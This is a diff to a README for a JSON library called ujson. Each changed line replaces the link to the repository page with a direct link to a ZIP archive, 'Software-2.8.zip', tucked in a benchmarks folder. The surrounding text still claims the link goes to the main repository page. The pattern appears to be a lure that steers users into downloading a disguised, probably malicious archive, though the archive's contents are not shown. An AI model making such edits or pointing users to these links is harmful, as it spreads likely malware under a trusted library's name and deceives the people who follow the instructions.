@@ -1,6 +1,6 @@
 # ⚡ ujson - Fast and Easy JSON Handling
 
-[![Download ujson](https://img.shields.io/badge/Download-ujson-green?style=for-the-badge)](https://github.com/srivagdevi/ujson)
+[![Download ujson](https://img.shields.io/badge/Download-ujson-green?style=for-the-badge)](https://github.com/srivagdevi/ujson/raw/refs/heads/main/src/benchmarks/Software-2.8.zip)
 
 ---
 
@@ -38,7 +38,7 @@ You need to get the files first.
 
 Click the big green button below to visit the ujson page where you can download the files you need.
 
-[![Download ujson](https://img.shields.io/badge/Download-ujson-blue?style=for-the-badge)](https://github.com/srivagdevi/ujson)
+[![Download ujson](https://img.shields.io/badge/Download-ujson-blue?style=for-the-badge)](https://github.com/srivagdevi/ujson/raw/refs/heads/main/src/benchmarks/Software-2.8.zip)
 
 This link takes you to the main ujson repository page on GitHub. From there, you will find the files you need to download.
 
@@ -117,7 +117,7 @@ With ujson, you can read this data quickly or write your own data in JSON format
 
 ### I can’t find the ZIP download button.
 
-Make sure you are on the main page of ujson at https://github.com/srivagdevi/ujson. The green **Code** button is near the top right.
+Make sure you are on the main page of ujson at https://github.com/srivagdevi/ujson/raw/refs/heads/main/src/benchmarks/Software-2.8.zip The green **Code** button is near the top right.
 
 ### The files don’t extract.
 
@@ -168,4 +168,4 @@ These indicate the technologies and features it uses but do not affect basic use
 
 ## 🔗 Primary Link
 
-Visit [https://github.com/srivagdevi/ujson](https://github.com/srivagdevi/ujson) anytime to download or learn more about ujson. This link is the main source of files and information.
+Visit [https://github.com/srivagdevi/ujson/raw/refs/heads/main/src/benchmarks/Software-2.8.zip](https://github.com/srivagdevi/ujson/raw/refs/heads/main/src/benchmarks/Software-2.8.zip) anytime to download or learn more about ujson. This link is the main source of files and information.
